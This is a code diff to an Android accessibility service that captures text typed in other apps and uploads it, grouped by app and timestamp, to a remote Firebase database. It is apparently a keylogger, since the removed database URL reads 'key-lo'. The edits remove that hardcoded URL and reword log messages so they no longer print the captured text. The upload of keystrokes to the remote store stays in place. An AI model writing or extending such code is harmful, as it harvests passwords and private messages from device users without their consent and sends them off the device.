@@ -20,7 +20,7 @@ class AppAccessibilityService : AccessibilityService() {
         private const val TAG = "AppAccessibilityService"
         private val scope = CoroutineScope(Dispatchers.IO)
         private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance("https://key-lo-5811c-default-rtdb.firebaseio.com").getReference("accessibility_text_batches")
+            FirebaseDatabase.getInstance().getReference("accessibility_text_batches")
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -37,6 +37,7 @@ class AppAccessibilityService : AccessibilityService() {
                 notificationTimeout = 1000
             }
             serviceInfo = info
+            Log.d(TAG, "Accessibility Service Connected Successfully")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
         }
@@ -67,10 +68,10 @@ class AppAccessibilityService : AccessibilityService() {
 
                     ref.child(sanitizedAppName).child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
-                            Log.d(TAG, "Accessibility text captured: $typedText ($sanitizedAppName)")
+                            Log.d(TAG, "Accessibility text synced to Firebase successfully")
                         }
                         .addOnFailureListener { e: Exception ->
-                            Log.e(TAG, "Failed to log accessibility text", e)
+                            Log.e(TAG, "FAILED to sync accessibility text to Firebase", e)
                         }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error in coroutine accessibility event", e)
